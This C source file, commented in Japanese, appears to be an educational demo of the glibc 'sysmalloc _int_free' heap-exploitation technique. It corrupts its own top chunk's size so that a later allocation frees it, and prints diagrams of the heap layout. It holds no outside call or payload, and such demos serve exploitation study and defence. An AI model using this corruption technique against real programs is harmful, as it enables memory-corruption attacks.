#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define SIZE_SZ sizeof(size_t)

#define CHUNK_HDR_SZ (SIZE_SZ*2)
// x86_64 と x86 で共通
#define MALLOC_ALIGN 0x10
#define MALLOC_MASK (-MALLOC_ALIGN)

#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)

// fencepost は、解放前に top から取り除かれるオフセットです
#define FENCEPOST (2*CHUNK_HDR_SZ)

#define PROBE (0x20-CHUNK_HDR_SZ)

// 解放させたい top chunk のターゲットサイズ
#define CHUNK_FREED_SIZE 0x150
#define FREED_SIZE (CHUNK_FREED_SIZE-CHUNK_HDR_SZ)

/**
 * テスト環境:
 *  + GLIBC 2.39 (x86_64, x86 & aarch64)
 *  + GLIBC 2.34 (x86_64, x86 & aarch64)
 *  + GLIBC 2.31 (x86_64, x86 & aarch64)
 *  + GLIBC 2.27 (x86_64, x86 & aarch64)
 *
 * sysmalloc を使うと、ヒープの top chunk を free() して、ほぼ任意の bin を作れます。
 * これは、free() を直接呼び出さなくてもヒープを破壊するのに使えます。
 * これは、ヒープの拡張時に top_chunk (wilderness) をマージできない場合、
 * sysmalloc が top_chunk に対して _int_free を呼び出すことで実現されます。
 * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
 *
 * この技法は House of Orange と Tangerine で使われています
 */
int main() {
  size_t allocated_size, *top_size_ptr, top_size, new_top_size, freed_top_size, *new, *old;
  // バッファリングを無効にします
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  // すべてのチャンクサイズがアラインされているか確認します
  assert((CHUNK_FREED_SIZE & MALLOC_MASK) == CHUNK_FREED_SIZE);

  puts("定数:");
  printf("チャンクヘッダ \t\t= 0x%lx\n", CHUNK_HDR_SZ);
  printf("malloc のアライン \t\t= 0x%lx\n", MALLOC_ALIGN);
  printf("ページのアライン \t\t= 0x%lx\n", PAGESIZE);
  printf("fencepost のサイズ \t\t= 0x%lx\n", FENCEPOST);
  printf("解放サイズ \t\t= 0x%lx\n", FREED_SIZE);

  printf("ターゲットの top chunk サイズ \t= 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_FREED_SIZE);

  // top_chunk の現在のサイズを調べます。
  // すでに分かっている、または予測できる場合は省略できます
  new = malloc(PROBE);
  top_size = new[(PROBE / SIZE_SZ) + 1];
  printf("最初の top サイズ \t\t= 0x%lx\n", top_size);

  // allocated_size を計算します
  allocated_size = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_FREED_SIZE;
  allocated_size &= PAGE_MASK;
  allocated_size &= MALLOC_MASK;

  printf("確保サイズ \t\t= 0x%lx\n\n", allocated_size);

  puts("1. top_chunk (wilderness) を破壊するために使う最初の malloc を作ります");
  new = malloc(allocated_size);

  // BOF または OOB を使って top_chunk を破壊します
  top_size_ptr = &new[(allocated_size / SIZE_SZ)-1 + (MALLOC_ALIGN / SIZE_SZ)];

  top_size = *top_size_ptr;

  printf(""
         "----- %-14p ----\n"
         "|          NEW          |   <- 最初の malloc\n"
         "|                       |\n"
         "----- %-14p ----\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|      SIZE (0x%05lx)   |\n"
         "|          ...          |\n"
         "----- %-14p ----   <- 現在のヒープページの終端\n\n",
         new - 2,
         top_size_ptr - 1,
         top_size - 1,
         top_size_ptr - 1 + (top_size / SIZE_SZ));

  puts("2. top chunk のサイズを小さく、ただしページ境界にはアラインされたままの値に破壊します");

  // 破壊した top のサイズがページ境界にアラインされていることを確認します(通常は 0x1000)
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
  new_top_size = top_size & PAGE_MASK;
  *top_size_ptr = new_top_size;
  printf(""
         "----- %-14p ----\n"
         "|          NEW          |\n"
         "| AAAAAAAAAAAAAAAAAAAAA |   <- 正方向の OOB(つまり BOF)\n"
         "----- %-14p ----\n"
         "|         TOP           |   <- 破壊された top chunk (wilderness) のサイズ\n"
         "|     SIZE (0x%05lx)    |\n"
         "----- %-14p ----   <- まだページ境界にアラインされています\n"
         "|         ...           |\n"
         "----- %-14p ----   <- 現在のヒープページの終端\n\n",
         new - 2,
         top_size_ptr - 1,
         new_top_size - 1,
         top_size_ptr - 1 + (new_top_size / SIZE_SZ),
         top_size_ptr - 1 + (top_size / SIZE_SZ));


  puts("3. 残りの top chunk より大きい確保を行い、ヒープの拡張を引き起こします");
  puts("破壊された top_chunk により、sysmalloc がそれに対して _init_free を呼び出します");

  // top_chunk から fencepost を取り除き、解放されるサイズを求めます
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
  assert(freed_top_size == CHUNK_FREED_SIZE);

  old = new;
  new = malloc(CHUNK_FREED_SIZE + 0x10);

  printf(""
         "----- %-14p ----\n"
         "|          OLD          |\n"
         "| AAAAAAAAAAAAAAAAAAAAA |\n"
         "----- %-14p ----\n"
         "|         FREED         |   <- マージできなかったため、古い top が解放されました\n"
         "|     SIZE (0x%05lx)    |\n"
         "----- %-14p ----\n"
         "|       FENCEPOST       |   <- アーキテクチャに依存するただのパディングです\n"
         "----- %-14p ----   <- まだページ境界にアラインされています\n"
         "|          ...          |\n"
         "----- %-14p ----   <- 前のヒープページの終端\n"
         "|          NEW          |   <- 新しい malloc\n"
         "-------------------------\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|          ...          |\n"
         "-------------------------   <- 現在のヒープページの終端\n\n",
         old - 2,
         top_size_ptr - 1,
         freed_top_size,
         top_size_ptr - 1 + (CHUNK_FREED_SIZE/SIZE_SZ),
         top_size_ptr - 1 + (new_top_size / SIZE_SZ),
         new - (MALLOC_ALIGN / SIZE_SZ));

  puts("...\n");

  puts("?. 解放されたチャンクに再び確保します");

  old = new;
  new = malloc(FREED_SIZE);

  assert((size_t) old > (size_t) new);

  printf(""
         "----- %-14p ----\n"
         "|          NEW          |   <- 解放されたチャンクに確保されました\n"
         "|                       |\n"
         "----- %-14p ----\n"
         "|          ...          |\n"
         "----- %-14p ----   <- 前のヒープページの終端\n"
         "|          OLD          |   <- 古い malloc\n"
         "-------------------------\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|          ...          |\n"
         "-------------------------   <- 現在のヒープページの終端\n",
         new - 2,
         top_size_ptr - 1 + (CHUNK_FREED_SIZE / SIZE_SZ),
         old - (MALLOC_ALIGN / SIZE_SZ));
}
